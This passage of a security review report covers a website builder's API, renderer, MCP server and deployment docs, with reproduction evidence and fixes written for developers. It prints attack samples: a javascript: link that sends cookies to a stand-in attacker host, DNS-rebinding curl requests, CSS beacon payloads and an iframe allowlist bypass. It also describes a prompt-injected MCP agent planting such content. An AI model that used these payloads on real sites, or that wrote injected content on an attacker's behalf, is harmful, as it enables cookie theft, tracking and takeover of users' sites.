# Neuravex — Security Review

An in-depth security scan of the Neuravex website builder as it stands on `main` at commit
`8e56c06` (20 September 2026). It covers the builder, its JSON API, the public renderer, the
MCP server, the desktop launcher and setup scripts, the static-site export, the dependency
tree, the CI pipeline and the deployment documentation.

Every finding below names the file and line it lives in and says how it was confirmed. Findings
were produced by ten independent review passes, each with a different lens, then merged and put
through a separate verification pass against a running production build: for the first thirty
findings two reviewers, one trying to reproduce each finding and one trying to refute it; for the
rest one reviewer doing both in turn. Only findings that survived verification are listed as
findings; the one that did not is recorded in §7 so it is not raised again.

---

## 1. Summary

Neuravex is in better shape than most unauthenticated local web apps. The previous security pass
replaced the regex sanitisers with parser-based ones, and those held against roughly 80 CSS,
55 SVG and a comparable number of HTML payloads. The CSP is nonce-based with `strict-dynamic`
on every route, the Origin check handles the tricky cases, uploads never keep their names, and
nothing in the builder or the published sites reaches a third party unless a content author put
it there. Section 6 lists what was verified to work.

What the review found is mostly at the edges of that design. Five things stand out:

1. **The "only your own browser can reach it" model is not enforced.** `next start` binds every
   interface, and the launcher never says otherwise (NVX-003). A DNS rebinding page gets past the
   Origin check because the server never validates which hostnames it serves (NVX-002). Both are
   small changes.
2. **Untrusted content has three ways to matter.** Anything from an imported archive, a pasted
   block or a prompt-injected MCP agent is stored without validation. A `javascript:` button link
   executes on the customer's exported site (NVX-001); stored HTML is parsed raw in the editor,
   where only the CSP stands between it and stored XSS on the origin that holds every site
   (NVX-024); an element `id` can stop React hydrating and lock the owner out of the editor for
   that site (NVX-045); and a family of CSS sinks turns the same content into tracking beacons and
   overlays (NVX-006 to NVX-009, NVX-023, NVX-025, NVX-062).
3. **The framework needs moving.** `next` 14.2.33 is two patches behind a public denial-of-service
   fix (NVX-010), and the 14.x line has ended while an unauthenticated Windows RCE and a dozen
   other advisories are fixed only on 15.5.x and 16.x (NVX-004). The unused image optimizer is
   live with a wildcard pattern (NVX-012).
4. **Resource limits are missing where the app is reachable without a browser.** Request bodies
   are buffered before any size check (NVX-016, NVX-017), form submissions have no rate or count
   limit (NVX-018), block trees have no schema, depth or size limit (NVX-013 to NVX-015), and a
   crafted stylesheet makes every page of a site answer 500 (NVX-019). None of these needs a
   victim; all of them need the port to be reachable, which is the default today.
5. **The deployment documentation would lead an operator into an insecure setup.** The Docker
   example cannot build and bakes the owner's data into the image (NVX-011); the nginx example
   has no access control (NVX-036); the backup advice loses data (NVX-037); the download breaks
   behind the proxy the docs recommend (NVX-026); and `npx` fallbacks can fetch and run a
   two-majors-ahead `prisma` from the registry (NVX-022).

Two things surfaced that are not attacks but belong in a launch decision: files uploaded while
the production server runs answer 404 until it is restarted (NVX-005), which breaks the media
library in exactly the mode customers run; and the generated Datenschutzerklärung asserts facts the
operator never confirmed, while the exported contact form leaks its answers into the URL
(NVX-040, NVX-020, NVX-021).

| Severity | Count | Ids |
| --- | --- | --- |
| Critical | 0 | |
| High | 4 | NVX-001, NVX-002, NVX-003, NVX-004 |
| Medium | 22 | NVX-006 to NVX-025 (except NVX-005), NVX-045, NVX-S001 |
| Low | 38 | NVX-005, NVX-026 to NVX-044, NVX-046 to NVX-062, NVX-S002, NVX-S003 |
| Info | 11 | NVX-063 to NVX-073 |

Seventy-five findings survived verification; one was refuted (see §7). Section 8 orders the fixes
by risk reduction per hour; the first block is about a day's work and removes every high finding
except the framework migration.

---

## 2. Scope and method

### What was examined

| Area | Files |
| --- | --- |
| Request boundary | `src/middleware.ts`, `next.config.js` |
| JSON API | every route under `src/app/api/**` (20 route files) |
| Rendering | `src/app/(published)/**`, `src/app/(builder)/**`, `src/components/public/*`, `src/components/blocks/*`, `src/components/editor/*`, `src/components/admin/*` |
| Sanitisers | `src/lib/sanitize.ts`, `src/lib/security.ts`, `src/lib/site-theme.ts`, `src/lib/seo.ts`, `src/lib/legal/*` |
| Files | `src/app/api/upload`, `src/app/api/media`, `src/app/api/stock`, `src/app/api/sites/[id]/download`, `src/lib/static-export.ts`, `src/lib/export-css.ts`, `src/lib/zip.ts`, `src/lib/image-size.ts` |
| Data | `prisma/schema.prisma`, `prisma/seed.ts`, `src/lib/prisma.ts`, `src/lib/site-archive.ts`, `src/lib/trash.ts`, `src/lib/restore.ts`, `src/lib/revisions.ts` |
| Automation | `mcp-server.ts`, `setup-mcp.sh`, `opencode.json` |
| Launcher and scripts | `electron/server.js`, `scripts/first-run.js`, `scripts/db-reset.js`, `start-desktop.*` |
| Supply chain | `package.json`, `package-lock.json`, `.github/workflows/ci.yml`, `npm audit` |
| Documentation | `README.md`, `INSTALL.md`, `.env.example`, `docs/PRODUCT_REVIEW.md` |

### How

- **Static review.** Each file in scope was read in full by at least one reviewer, most by
  three or more (the lenses overlap on purpose).
- **Dynamic testing.** A production build (`next build`, then `next start` bound to loopback)
  was run against a scratch database with the seeded demo site. Findings were exercised with
  `curl`, with small `tsx` scripts calling the library functions directly (the sanitisers,
  the export helpers, the archive parser), and with headless Chromium where browser behaviour
  (CSP, script execution) decides the outcome.
- **Dependency audit.** `npm audit --json` against the committed lockfile, with each advisory
  checked against the installed version and against whether the vulnerable code path is
  reachable from this application.
- **Verification.** Every merged finding went to a reviewer who had not written it, tasked first
  with reproducing it and then with refuting it (the first thirty went to two such reviewers, one
  per role). A finding is listed only if it survived, and its severity, location and impact were
  corrected where the verification disagreed with the original report.

### Baseline at the time of review

| Check | Result |
| --- | --- |
| `npx tsc --noEmit` | clean |
| `npm run lint` | clean |
| `npm test` (vitest) | 26 files, 382 tests, all pass |
| `npm run build` | succeeds |
| `npm audit` | 13 advisories: 1 critical, 7 high, 5 moderate (see §5) |
| Playwright e2e | 23 spec files exist; not run in CI |

Installed versions that matter: `next` 14.2.33, `sanitize-html` 2.17.5, `postcss` 8.5.26,
`@prisma/client` 5.22.0, `zod` 4.4.3, `@modelcontextprotocol/sdk` 1.x.

---

## 3. Threat model

Neuravex has no sign-in by design. The builder, the JSON API and every published site share
one origin, and anything that can send a request to that origin can do everything the owner
can. That single fact shapes every finding here, so the deployment contexts are spelled out
and each finding says which of them it applies to.

| Context | Description | Who can reach the API |
| --- | --- | --- |
| **L — Local** | The default: `npm run desktop` on the owner's machine, browser on the same machine, other tabs open. | Any page open in the same browser (via CSRF or DNS rebinding); any process on the machine. |
| **N — Network** | The same instance, but `next start` binds every interface unless told otherwise, so it is reachable on the LAN or the internet. | Anyone who can route to the port. |
| **P — Proxied** | Behind a reverse proxy with the operator's own access control, as `INSTALL.md` suggests. | Whoever the proxy lets through; every such person is an administrator of every site. |
| **S — Static export** | The zip from *Download site*, hosted by the customer somewhere else. | Visitors of the exported site. The builder is not involved. |
| **M — MCP** | An AI agent connected over stdio writes content through `mcp-server.ts`. The agent may have been prompt-injected by a web page or document it read. | Whatever the agent was told to write lands in the database unsanitised and is rendered later. |

Content sources that are **not** the owner typing, and so must be treated as untrusted when
rendered on the builder's origin:

- a site archive pasted into *Import* (`POST /api/sites/import`);
- anything written by an MCP client (context M);
- blocks pasted from the clipboard (`src/lib/clipboard.ts`);
- files uploaded through the media library, which are then served from `public/uploads` on the
  same origin;
- form submissions from visitors of a published page (`POST /api/submissions`, deliberately
  unauthenticated);
- starter templates and bundled stock imagery (trusted, but they are code that ships).

### Severity scale used

| Severity | Meaning here |
| --- | --- |
| **Critical** | Remote code execution, arbitrary file read or write on the host, or full control of every site by a network attacker with no user interaction in context L or N. |
| **High** | The same outcomes needing one user interaction (visiting an attacker's page, importing a malicious archive, accepting MCP-written content); stored XSS that runs on the builder origin from any non-owner content source; SSRF whose response the attacker can read. |
| **Medium** | Denial of service or disk/memory exhaustion reachable without auth; information disclosure; sanitiser bypasses that reach an exfiltration channel (CSS or image beacons) but not script; weaknesses that only matter in N or P. |
| **Low** | Defence-in-depth gaps, missing hardening with no concrete exploit path, documentation that would lead an operator into an insecure setup. |
| **Info** | Observations and positive controls worth recording. |

---

## 4. Findings

Each finding gives the file and line it lives in, the deployment contexts it applies to (see §3),
how it was confirmed, and the fix. "Reproduced" means the outcome was demonstrated against the
running production build, not inferred from reading. Findings are ordered by severity and, within
a severity, by how much they matter to the default installation.

### High

#### NVX-002 — DNS rebinding defeats the Origin check, because the server never validates Host

| | |
| --- | --- |
| Where | `src/middleware.ts:115` (`if (serving && asked === serving) return null;`), with `src/middleware.ts:97` (GET never checked) and `:105` (Host taken from the request) |
| Contexts | L, N |
| Confirmed | Reproduced server-side by two independent verifiers. The browser hop (the DNS flip) was not exercised here. |

The CSRF defence compares the `Origin` header's host with the request's own `Host` header. Nothing
anywhere pins which hostnames the server answers for, so a request whose `Origin` and `Host` are
both `attacker.tld:3939` passes, and `GET` requests are never checked at all. That is the shape of a
DNS rebinding attack: the victim opens an attacker page, `attacker.tld` first resolves to the
attacker's server and then flips to `127.0.0.1`, and from then on the page's fetches to
`http://attacker.tld:3939/api/…` are same-origin with matching headers. Because the app has no
authentication, that is full read and write over every site and every stored visitor submission.

Evidence, against the running production server:

```
$ curl -s -X POST -H "Host: attacker.tld:3939" -H "Origin: http://attacker.tld:3939" \
    -H "Content-Type: application/json" -d '{"name":"rebind-probe"}' http://127.0.0.1:3939/api/sites
HTTP/1.1 201 Created
$ curl -s -X DELETE -H "Host: attacker.tld:3939" -H "Origin: http://attacker.tld:3939" \
    "http://127.0.0.1:3939/api/sites/<id>?permanent=1"
HTTP/1.1 200 OK
$ curl -s -H "Host: attacker.tld:3939" http://127.0.0.1:3939/api/sites/<id>/export
{"version":3,"exportedAt":"…","site":{…   (26 KB of site JSON)
```

Calibration notes from the verifiers: current Chromium silently refuses insecure-context requests
to loopback addresses (Local Network Access), and current Firefox prompts, so the fully exposed
population today is Safari and older browsers. It is still high: one page visit, no further
interaction, and every site is gone or rewritten. It does not apply behind a proxy that sets its
own `Host` (context P).

**Fix.** Validate `Host` for every method, before the Origin comparison and before the CSP nonce is
minted. Accept `localhost`, `*.localhost`, IPv4/IPv6 literals (a literal host cannot come from a DNS
flip) and any names listed in a new `NEURAVEX_ALLOWED_HOSTS` variable, and answer everything else
with `421 Misdirected Request`. Keep the existing Origin comparison as the second layer. Document
the variable in `INSTALL.md` for reverse-proxy operators. Add a unit test that a foreign `Host` is
refused on both `GET` and `POST` even when `Origin` matches. Effort: 2 to 4 hours.

#### NVX-003 — The launcher and `npm run start` bind every network interface

| | |
| --- | --- |
| Where | `electron/server.js:90` (`spawn("npx", ["next", "start", "-p", String(PORT)], …`), `package.json:9` (`"start": "next start"`), `INSTALL.md` Docker example (`-p 3000:3000`) |
| Contexts | L becomes N |
| Confirmed | Reproduced by four independent passes. |

`next start` listens on `0.0.0.0` unless given `-H`, and neither the desktop launcher nor the
`start` script passes one. The README, the middleware comment and the entire defence design assume
the builder is reachable only from the owner's own browser. On a shared network it is reachable
from every other host, and because the Origin check deliberately admits requests that carry no
`Origin` header (curl, scripts), a network attacker is not even slowed down by the CSRF defence.

```
$ npx next start -p 4997 &            # no -H, as the launcher does
$ awk '$4=="0A"' /proc/net/tcp        # 00000000:1385 = 0.0.0.0:4997
$ curl -s -o /dev/null -w '%{http_code}\n' http://192.0.2.2:4997/api/sites   # non-loopback address
200
$ curl -s -X POST -H 'Content-Type: application/json' -d '{"name":"lan"}' http://192.0.2.2:4997/api/sites
201
```

The in-app `NetworkNotice` banner warns the *owner* when they browse to a non-local hostname. It is
mounted only on the sites list, and it does nothing about anyone else on the network. The only
thing separating this from critical is that reaching the port needs the owner to be on a network
segment without a host firewall, which is a common state for a laptop.

**Fix.** Pass `-H 127.0.0.1` by default in `electron/server.js:90` and change the `start` script to
`next start -H 127.0.0.1`; allow a wider bind only through an explicit `HOST` variable and log a
loud warning when it is set. Change the Docker run line to `-p 127.0.0.1:3000:3000`. Mount
`NetworkNotice` in the builder layout so every admin page shows it. Effort: about an hour plus a
documentation pass.

#### NVX-001 — The button block writes any `href` into the page, so a `javascript:` link from an import or the MCP server runs on the exported site

| | |
| --- | --- |
| Where | `src/components/blocks/ButtonBlock.tsx:75` (`<a href={props.href}>`); no write path validates it: `src/app/api/pages/[id]/save/route.ts:64`, `src/app/api/pages/[id]/route.ts:41`, `src/lib/site-archive.ts` (import copies content verbatim), `mcp-server.ts:52` (`props: z.record(z.string(), z.unknown())`), `src/lib/clipboard.ts` |
| Contexts | S (executes); L, N, P (blocked by CSP) with the content arriving via M, import or paste |
| Confirmed | Reproduced end to end in headless Chromium: the click on the exported page fired `alert(document.domain)`. |

Nothing checks the scheme of a button link. A block whose `href` is
`javascript:fetch('https://attacker/'+document.cookie)` is stored, published, and copied into the
download zip unchanged. On the builder origin the nonce CSP refuses the `javascript:` navigation
(verified: `script-src-elem` violation, no dialog). The exported site has no CSP at all, so on the
customer's own domain the call-to-action button, the element visitors click most, runs the
attacker's script. `data:` and `vbscript:` go through the same path; both are far less useful in
current browsers.

**Fix.** Add one `isSafeHref()` in `src/lib/security.ts` (allow `http:`, `https:`, `mailto:`,
`tel:`, relative paths and fragments; return `undefined` for anything else, after trimming and
decoding) and a `sanitizeBlockTree()` that applies it to `button.href`, `image.src`, `video.src` and
`poster`. Call it on every write path (save, PATCH, page create, import, MCP `save_page`, paste) and
once more at render in `ButtonBlock.tsx:75`. Emit
`<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none'; base-uri 'none'">`
into every exported page from `src/lib/static-export.ts` as a second layer. Effort: half a day
including tests.

#### NVX-004 — Next.js 14.x no longer receives security fixes; the remaining advisories are patched only on 15.5.x and 16.x

| | |
| --- | --- |
| Where | `package.json:30` (`"next": "^14.2.33"`) |
| Contexts | N and P for most; a Windows host in N for the worst |
| Confirmed | Version facts verified against the registry and the advisories; the RCE itself was not reproduced (Linux box, mechanism withheld). |

`npm audit` lists 25 advisories against `next`. Two have a fix on the 14.x line (see NVX-010). The
rest, including an unauthenticated remote code execution on Windows hosts
(GHSA-p293-qw3h-jr36, affected `>=13.4.0 <15.5.24`, "no known workaround"), the AVIF image
optimizer RCE (latent here: it needs `sharp`, which is not installed), the image optimizer denial of
service, cache poisoning and the CSP-nonce XSS, are patched only from 15.5.24 or 16.3.3 upward. The
14.x line ends at 14.2.35. `INSTALL.md` lists Windows 10/11 as fully supported and the repository
ships `start-desktop.bat`, and the launcher binds every interface (NVX-003), so a Windows user on
a shared network runs an unpatchable, network-reachable, unauthenticated server.

**Fix.** Treat the upgrade to `next@15.5.x` (the maintained backport line) or `16.x` as a launch
blocker for any Windows or network-reachable deployment. It is a major migration: React 19, async
`params`/`headers`/`cookies`, `serverComponentsExternalPackages` becomes
`serverExternalPackages`, `next lint` is removed, and the CSP-nonce middleware must be re-tested.
Budget 2 to 4 days with the full test suite as the gate. Until then: bind to loopback (NVX-003), do
not install `sharp`, disable the image optimizer (`images.unoptimized: true`; nothing in the app
uses `next/image`), and say in `INSTALL.md` that Windows hosts must stay loopback-only.

### Medium

#### NVX-010 — The installed `next` misses the two 14.x patches for the React Server Components deserialisation denial of service

| | |
| --- | --- |
| Where | `package.json:30`; the vulnerable path is `node_modules/next/dist/server/app-render/action-handler.js` (decode before validation) |
| Contexts | N, P before auth, and L via NVX-002 |
| Confirmed | Reachability reproduced: a `POST` with a `Next-Action` header reaches the action handler (200, and a multipart probe produced a 500 whose stack runs through `decodeAction`). The CPU-hang payload is not public and was not run. |

GHSA-mwv6-3258-q52c (fixed in 14.2.34) and GHSA-5j59-xgg2-r9c4 (fixed in 14.2.35): a crafted
request body is deserialised by the RSC runtime before the action id is validated and can peg the
CPU. The app defines no Server Actions, which is exactly why 14.2.34 helps so much here: it adds a
`hasServerActions` check that answers 404 before any decoding. One process serves the builder and
every published site, so a hang takes everything down until restart.

**Fix.** `npm i next@14.2.35` is a drop-in patch (the diffs touch only internal action handling).
Minutes, plus a CI run. Then plan NVX-004.

#### NVX-024 — The editor writes stored block HTML into the DOM unsanitised; CSP stops script but not restyling, beacons or a meta refresh

| | |
| --- | --- |
| Where | `src/components/blocks/Editable.tsx:51` (`ref.current.innerHTML = value;`); the sanitised path at `:68` runs only when `disabled` |
| Contexts | L, N, P with content arriving via M, import or paste |
| Confirmed | Reproduced in headless Chromium against the production server. |

In edit mode every text, heading, quote, list and button-label prop is parsed live on the builder
origin, and `report()` hands the raw `innerHTML` back to autosave, so the markup survives. A
text prop containing `<style>body{outline:solid 5px red}</style>` restyled the whole admin
document; an `<img src="https://…">` beacon and a cross-origin `<iframe>` were fetched the moment
the page opened in the editor; `<meta http-equiv="refresh" content="0;url=…">` navigated the tab
away. Inline handlers and `javascript:` links were refused by the CSP, which is the only thing
standing between this and stored XSS on the origin that holds every site. The MCP block schema and
the import path both accept such props.

**Fix.** Sanitise on the way in and on the way out of `contentEditable` with a tight inline-text
profile (`b`, `i`, `u`, `s`, `em`, `strong`, `a`, `br`, `span`; `href` through `isSafeHref()`;
no `img`, `style`, `meta`, `iframe`, `form`), and run the same profile server-side over
text/label/items props in the save, PATCH, import and MCP paths (the tree walker from NVX-001).
Check that the toolbar's `execCommand` output still round-trips. Effort: about half a day.

#### NVX-006 — The HTML sanitiser allows a `style` attribute on every element and never filters it

| | |
| --- | --- |
| Where | `src/lib/sanitize.ts:35` (`"*": ["class", "id", "style"]`, no `allowedStyles`) |
| Contexts | L, N, P (published page and editor) and S, with content from M, import or paste |
| Confirmed | Reproduced: the beacon was fetched from the published page, the editor and the export; a `position:fixed;inset:0` overlay measured the full viewport. |

`sanitize-html` only parses a `style` attribute when `allowedStyles` is configured; without it the
attribute is copied byte for byte. So `style="background:url(https://attacker/log)"` on any element
the sanitiser accepts becomes a per-visit beacon, and `position:fixed;inset:0;z-index:9999` becomes
a full-page overlay that also covers the builder's own editor. The header comment in the file
promises CSS expressions are stripped; it is not true for attributes. No script runs
(`expression()` and `behavior` are dead in every current engine), which is why this is medium:
tracking and UI redress, not code execution. The escaped form `\75 rl(` also passes, so a regex on
`url(` would not be enough.

**Fix.** Filter the attribute with the parser that already exists: in a `transformTags['*']` hook,
wrap the value as `x{…}`, `postcss.parse` it, drop every declaration that fails
`declarationIsSafe()` from `src/lib/security.ts` (export it), and additionally drop `position:
fixed|absolute|sticky`, `z-index` and `pointer-events`. Fix the header comment. Tests for `url()`,
`\75 rl(`, `position:fixed` and a `color:red` that must survive. Effort: 3 to 4 hours.

#### NVX-007 — Block colour and background props are interpolated into inline styles; a `;` injects further declarations

| | |
| --- | --- |
| Where | `src/components/blocks/Heading.tsx:43`, `Text.tsx:36`, `Divider.tsx:15`, `src/lib/block-style.ts:65-66` and `:73` (Section and Columns background and overlay), plus `Columns.tsx` gap and `Section.tsx` padding |
| Contexts | Published page, editor and S, with content from M or import |
| Confirmed | Reproduced live and in the export. |

React serialises a style object without validating values, so a heading colour of
`red;background:url(https://attacker/x)` renders as two declarations. Quotes are escaped, so there is
no markup break-out; the sink is React, not `sanitize-html`, so NVX-006's fix does not cover it.
Impact is the same beacon class as NVX-006.

**Fix.** Add `cssColor()` and `cssLength()` helpers (hex, `rgb()`/`hsl()` with numeric arguments,
named colours, `transparent`, `currentColor`, `var(--site-…)`; finite numbers for lengths) and use
them at every sink above; add a server-side `normalizeBlockTree()` (shared with NVX-001) so bad
values never persist. Effort: about a day with tests.

#### NVX-008 — The site accent colour is stored unvalidated and rendered into inline styles on the builder's own pages

| | |
| --- | --- |
| Where | `src/app/api/sites/[id]/route.ts:39` (stores any string), `src/lib/templates.ts:3006` (`resolveSiteAccent` returns the request unchanged, used by `POST /api/sites` and MCP `create_site`), `src/lib/site-archive.ts:132` (import); sinks at `src/app/(builder)/page.tsx:61`, `src/app/(builder)/admin/sites/[id]/page.tsx:35`, `src/components/public/SiteChrome.tsx:141` |
| Contexts | L, N, P (the dashboard) and S, with the value arriving via M or import |
| Confirmed | Reproduced: Chromium fetched the beacon from the dashboard, the site page and the export. |

`siteThemeCss()` validates the accent with `parseHex()`, so the theme CSS is safe. Three inline
style sinks do not validate. The MCP `create_site` schema documents "hex accent color" but is a bare
`z.string()`. A prompt-injected agent that creates a site with accent
`#fff 0%, #000 100%);background-image:url(https://attacker/ping);/*` makes the owner's browser beacon
to the attacker on every visit to the dashboard, without the poisoned site ever being opened. This is
the one CSS sink that fires on the admin home page.

**Fix.** One helper, three sinks, three write paths: `resolveSiteAccent` returns the template or
default colour unless `parseHex()` accepts the request; the PATCH route and `siteCreateData()` apply
the same check; a `safeAccent()` in `src/lib/site-theme.ts` guards the three render sites so legacy
rows cannot inject. Effort: 1 to 3 hours.

#### NVX-009 — Tailwind arbitrary values in `class` attributes compile into the exported stylesheet

| | |
| --- | --- |
| Where | `src/lib/export-css.ts:24` (the exported HTML is Tailwind's content source) |
| Contexts | S, with content from M, import or paste |
| Confirmed | Reproduced: `assets/site.css` in the download contained `background: url(https://evil.example/beacon)` and `mask-image: url(…)`, and Chromium loading the export requested them. |

The download compiles a fresh stylesheet by running Tailwind over the exported pages themselves.
`sanitize-html` keeps `class` on every element, so an HTML block carrying
`class="[mask-image:url(https://attacker/m)]"` is inert in the builder (its Tailwind is precompiled)
but becomes a live rule in the customer's site. `sanitizeCss()` never sees this stylesheet. Any
arbitrary property works (`[border-image:…]`, `[cursor:url(…)]`, `before:content-[url(…)]`), so
stripping one token is not a fix; and stripping every `[...]` class would break the export, because
the builder's own components use arbitrary lengths.

**Fix.** After Tailwind runs, walk `result.root` with postcss and remove every declaration whose
`url()`/`image-set()` argument is not `#…`, `uploads/`, `stock/`, `./` or `data:image/`, reusing
`cssFunctionCalls()` from `src/lib/security.ts`; also drop `--tw-content` values containing `url(`.
Test that `[background:url(https://x)]` produces no external URL while `text-[11px]` still compiles.
Effort: about 2 hours.

#### NVX-023 — The iframe allowlist is a prefix match, so `youtube.com.evil.example` passes

| | |
| --- | --- |
| Where | `src/lib/sanitize.ts:43` (regex with no host terminator); the CSP list in `src/middleware.ts:29-37` is a different set, so the comment there that the two "cannot drift" is already false |
| Contexts | S (the builder's CSP `frame-src` blocks it on L, N, P) with content from M, import or paste |
| Confirmed | Reproduced through the sanitiser and into the exported `index.html`. |

`https://youtube.com.evil.example/x`, `https://vimeo.com@evil.example/x` and the protocol-relative
`//youtube.com.evil.example/x` all survive; `https://evil.example/x` is removed. In the exported
site nothing else blocks the frame, so the customer's domain embeds an attacker-controlled frame
(a fake checkout or contact form). The kept `allow` attribute lets the frame request camera or
microphone delegation on the customer's page. A cross-origin frame cannot read the parent, hence
medium.

**Fix.** One module `src/lib/embed-hosts.ts` exporting the exact hostname set and an
`isAllowedEmbed(src)` that parses with `new URL()`, requires `https:`, no userinfo, and an exact
hostname match; use it in the sanitiser's `exclusiveFilter` and derive the CSP `frame-src` from the
same array. Force `sandbox` and `referrerpolicy` on surviving iframes. Effort: 1 to 3 hours.

#### NVX-025 — The SVG sanitiser misses `href` attributes that use a custom XLink namespace prefix

| | |
| --- | --- |
| Where | `src/lib/security.ts:283` (`URL_ATTRS = /^(?:href|src|xlink:href)$/i`) and `:348` |
| Contexts | S (on the builder origin the CSP blocks the click once the file is served at all, see NVX-005); the file comes from the owner's own upload of a third-party SVG |
| Confirmed | Reproduced: the uploaded file kept `x:href="javascript:…"`, and clicking it in the exported site fired `alert(document.domain)`. |

SVG is XML. `<svg xmlns:x="http://www.w3.org/1999/xlink"><a x:href="javascript:…">` is the same
attribute to a browser as `xlink:href`, but the sanitiser matches attribute names literally and
`x:href` is not on its list, so the value is stored verbatim and served as `image/svg+xml`. The same
gap lets `<image x:href="https://…">` beacons through. Opening the SVG directly on the customer's
site and clicking runs script on that origin; embedded through `<img>` it is inert.

**Fix.** Resolve the attribute's local name (the part after the last `:`) before testing it against
`href|src`; drop any attribute with a prefix other than `xml`/`xlink`; consider removing `a` from
`SVG_TAGS` altogether, since an uploaded picture has no need for links. Add the `x:href`,
`XLINK:HREF` and `<image x:href>` probes to `security.test.ts`. Effort: 2 to 3 hours.

#### NVX-011 — The Docker example in `INSTALL.md` cannot build as written, and would be insecure if it could

| | |
| --- | --- |
| Where | `INSTALL.md:209-236` |
| Contexts | P |
| Confirmed | Each sub-claim reproduced without a Docker daemon (the postinstall failure, the missing `.dockerignore`, the missing `DATABASE_URL`, the empty-database 500). |

`RUN npm ci` runs before the schema is copied, and the `postinstall` hook (`prisma generate`) fails
with "Could not find Prisma Schema". There is no `.dockerignore`, so `COPY . .` inside an owner's
working copy bakes `.env`, `prisma/dev.db` with its WAL, every upload and the host `node_modules`
into the image, and the named volume mounted at `/app/prisma` is seeded from that. The runner never
sets `DATABASE_URL` and never runs the schema push, so a clean build answers 500 on every page. It
runs as root, ships the full dev dependency tree, and `-p 3000:3000` publishes the unauthenticated
builder on every host interface three paragraphs below the sentence that says not to.

**Fix.** Ship a tested `Dockerfile` and `.dockerignore` in the repository and point `INSTALL.md` at
them: copy `prisma/` before `npm ci` (or `--ignore-scripts` then `prisma generate`), `output:
'standalone'` or `npm ci --omit=dev` in the runner, `ENV DATABASE_URL=file:/data/neuravex.db`,
`VOLUME /data /app/public/uploads`, `USER node`, a `HEALTHCHECK`, and an entrypoint that runs
`node scripts/first-run.js` before `next start`. Run line `-p 127.0.0.1:3000:3000`. Build and boot it
once in CI. Effort: half a day.

### Medium: resource exhaustion, validation and privacy

#### NVX-012 — The image optimizer is live with a wildcard remote pattern although nothing uses it

Where: `next.config.js:13-14` (`images.unsplash.com`, `*.googleapis.com`); `src/middleware.ts:130`
excludes `/_next/image` from the matcher. Contexts: L (any page can embed
`<img src="http://localhost:3939/_next/image?url=…">`), N, P. Reproduced (the server performed the
upstream fetch for an allowed host and refused others).

No component imports `next/image`, so `/_next/image` is pure attack surface. `storage.googleapis.com`
matches the wildcard and anyone can host an "allowed" object there; on 14.2.33 the optimizer
buffers the whole upstream body and the disk cache is unbounded (two of the open advisories in
§5). It is also an outbound request from a product that says it makes none. The AVIF RCE framing
from the raw finding was dropped: it needs `sharp`, which is not installed.

Fix: `images: { unoptimized: true }` and delete `remotePatterns`; verify `/_next/image` answers
404. One line, no regression risk.

#### NVX-013 — An out-of-range `sortOrder` breaks an entire site with one request

Where: `src/app/api/pages/[id]/route.ts:43` (`data.sortOrder = body.sortOrder;`),
`src/lib/site-archive.ts:167` (import carries the same value). Contexts: N, M, import. Reproduced.

Any finite number is written to the 32-bit `Int` column. SQLite stores `1e12`; every later Prisma
read of that row throws, and the public site, `GET /api/sites/[id]`, the pages list and the
download all answer 500 until the row is repaired by hand in the database.

Fix: one shared integer validator clamping to `0..2^31-1` (400 otherwise) at every write boundary,
including the MCP reorder tools; or widen the column. Small change.

#### NVX-014 — Block trees are never schema-validated, so a mis-typed prop breaks rendering and, in one case, page creation for the whole site

Where: `src/app/api/pages/[id]/save/route.ts:64`, `src/app/api/pages/[id]/route.ts:41`,
`src/lib/site-archive.ts:164`, `mcp-server.ts:52` (`props: z.record(z.string(), z.unknown())`).
Contexts: M, import, paste. Reproduced.

Renderers dereference props unguarded (`List` maps `props.items`, `Form` maps `props.fields`,
`Heading` builds its tag from `props.level`, `CustomHtml` hands a non-string to the sanitiser, which
throws), and there is no `error.tsx` anywhere, so a bad prop is a durable 500 on the editor and the
public page and a failed export. A `null` node is worse: `POST /api/sites/[id]/pages` reads every
sibling page to pick a starting look and crashes, so no new page can be created on that site until
the row is fixed.

Fix: one zod schema for the block tree with per-type props, enforced in save, PATCH, page create,
import, the MCP tools, saved blocks and revision restore; defensive renderers; an error boundary
around the canvas; a download that skips and reports an unrenderable page. Medium effort; shares
the validator with NVX-001 and NVX-015.

#### NVX-015 — No depth or size limit on block trees

Where: `mcp-server.ts:57` (`z.array(blockSchema)` with no cap), the same on save, PATCH and import.
Contexts: M, import. Reproduced: about 200 levels broke the editor, about 400 the public page,
8000 the legal audit and the download.

Recursive walkers (the renderer, `src/lib/legal/audit.ts:172`, the RSC serialiser) overflow the
stack, and with no error boundary the overflow is a 500 the owner cannot click past to repair.

Fix: a maximum depth (32 is generous), node count and serialised size at every write boundary;
depth-guarded or iterative walkers. Shares the validator with NVX-014.

#### NVX-016 — JSON bodies are buffered and parsed in full before any size check

Where: `src/app/api/submissions/route.ts:10` (`await req.json()`), `:19-20` (the 64 KB cap covers
only `data`); the same pattern on save, `POST /api/sites`, `PATCH /api/media` and
`POST /api/sites/import`, which has no cap at all. Contexts: N (the submissions route needs no
Origin header by design), P before auth. Reproduced: a 40 MB body with padding outside `data` was
accepted with 201; a 200 MB body was rejected with 413 after being fully materialised, and the
process grew by about 960 MB while it was.

Fix: a shared helper that checks `Content-Length` and reads the body stream with a hard byte cap
before `JSON.parse`, returning 413 early; measure the raw body, not one key; give import a total
size and page-count cap.

#### NVX-017 — The upload route buffers the whole multipart body before the 10 MB check

Where: `src/app/api/upload/route.ts:27` (`await req.formData()`), `:31` (the size check). Contexts:
N, P. Reproduced: a single 200 MB upload grew the process by about 825 MB before the 400.

Fix: check `Content-Length` before `formData()` and return 413; better, stream the part to a temp
file with a running counter. Add `client_max_body_size 11m;` to the nginx example.

#### NVX-018 — Form submissions have no rate limit or row cap

Where: `src/app/api/submissions/route.ts:24`. Contexts: N and P (a scripted client; a cross-site
browser POST is refused by the Origin check). Reproduced: 500 submissions of about 60 KB in 2.6 s,
the database grew by 30 MB plus a 7 MB WAL.

Each row is bounded, the number of rows is not, the viewer's `take: 100` hides the growth, and the
page id is printed in every published page. Sustained posts fill the disk and stop the whole app.

Fix: a per-client rate limit (429), a per-page count cap, an optional retention window; document
proxy-level rate limiting for exposed deployments. No schema change.

#### NVX-019 — The CSS sanitiser recurses per nested call and is quadratic; a crafted stylesheet 500s every public page of the site

Where: `src/lib/security.ts:101` (`calls.push(...cssFunctionCalls(arg))`); `sanitizeCss()` guards
only `postcss.parse`, not the declaration walk. Contexts: M, import, N. Reproduced: a 45 KB
`customCss` with 9000 nested `rgb(` made every page of that site answer 500 (the demo site was
unaffected).

